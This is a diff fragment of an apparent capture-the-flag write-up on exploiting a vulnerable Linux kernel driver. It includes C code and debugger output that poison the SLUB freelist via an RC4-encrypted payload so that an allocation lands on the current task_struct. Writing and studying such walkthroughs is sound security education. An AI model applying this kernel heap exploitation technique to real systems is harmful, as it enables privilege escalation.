@@ -420,3 +420,130 @@ static char key_buf[MAX_RC4_LEN] = { 0x35, 0x00  };
 static char key_buf[MAX_RC4_LEN] = { 0xdd, 0x01  };
 ...
 ```
+
+If we send any input with this key, we will create a loop, because the last byte will always be 0. 
+
+```c
+gef> x/4gx 0xffff88803db71930
+0xffff88803db71930:	0xc892007ebe0fecff	0x90d3b4c1565fea10
+0xffff88803db71940:	0xffff88803db71940	0x0000000000000000
+
+gef> slub-dump kmalloc-16
+...
+0x093 0xffff88803db71930 (in-use)
+0x094 0xffff88803db71940 (next: 0xffff88803db71940: Corrupted (Loop detected))
+0x095 0xffff88803db71950 (in-use)
+...
+```
+
+Now, when we `create_buf` again, there will be 2 allocations one for `secure_buffer`, and the second one for our encrypted data, and both will end up in the same address: ``0xffff88803db71940``.
+
+The last step is create a function that RC4 encrypts our input and sends it to the kernel, so when the internal `rc4_crypt` function gets called, the data gets decrypted into the kernel heap. As I said, I do not know anything about cryptography, so I simply copied the functions from the kernel driver source code.
+
+```c
+struct rc4_state {
+	unsigned char	perm[256];
+	unsigned char	index1;
+	unsigned char	index2;
+};
+
+static __inline void swap_bytes(unsigned char *a, unsigned char *b)
+{
+	unsigned char temp;
+
+	temp = *a;
+	*a = *b;
+	*b = temp;
+}
+
+static void rc4_init(struct rc4_state *const state, unsigned char *key, int keylen)
+{
+	unsigned char j;
+	int i;
+
+	for (i = 0; i < 256; i++)
+		state->perm[i] = (unsigned char)i; 
+	state->index1 = 0;
+	state->index2 = 0;
+
+	for (j = i = 0; i < 256; i++) {
+		j += state->perm[i] + key[i % keylen]; 
+		swap_bytes(&state->perm[i], &state->perm[j]);
+	}
+}
+
+static void rc4_crypt(struct rc4_state *const state, const unsigned char *inbuf, unsigned char *outbuf, int buflen)
+{
+	int i;
+	unsigned char j;
+
+	for (i = 0; i < buflen; i++) {
+
+		state->index1++;
+		state->index2 += state->perm[state->index1];
+
+		swap_bytes(&state->perm[state->index1],
+		    &state->perm[state->index2]);
+
+		j = state->perm[state->index1] + state->perm[state->index2];
+		outbuf[i] = inbuf[i] ^ state->perm[j];
+	}
+}
+
+static void get(char *payload, int len, char* outbuf){ 
+	struct rc4_state state;
+	rc4_init(&state, key_buf, strlen(key_buf));
+	rc4_crypt(&state, payload, outbuf, len);
+
+}
+
+static void send_enc(void *payload, int len){
+	char * res = malloc(len);
+
+	get(payload, len, res);
+
+	create_buf(len, res);
+
+	free(res);
+}
+
+```
+
+The last function `send_enc` receives a payload, encrypts it with our key and sends it to the driver. In addition to that, we have a `payload_t` struct that has 0x10 bytes, to make it easier to concatenate data:
+
+```c
+struct payload_t{
+	unsigned long addr;
+	unsigned long pad;
+};
+```
+
+Now that we have a loop, we can send `current` address and a padding of 8 bytes to reach size 16, this will get written on the next pointer in the heap.
+
+```c
+	struct payload_t curr = {
+		.addr = current,
+		.pad = 0x4141414141414141
+	};
+	send_enc(&curr, sizeof(struct payload_t)); 
+```
+
+```c
+/home/user $ /chall/run 
+[*] Opened device
+[!] The key is �
+[*] task_struct current : 0xffff88803dbb4140
+[*] PID : 0x7b
+
+gef> x/4gx 0xffff88803db71930
+0xffff88803db71930:	0x4141414141414141	0x4141414141414141
+0xffff88803db71940:	0xffff88803dbb4140	0x4141414141414141
+```
+
+After the last kmalloc:
+
+```c
+gef> x $rax
+0xffff88803dbb4140:	0x0000000000000000
+
+```
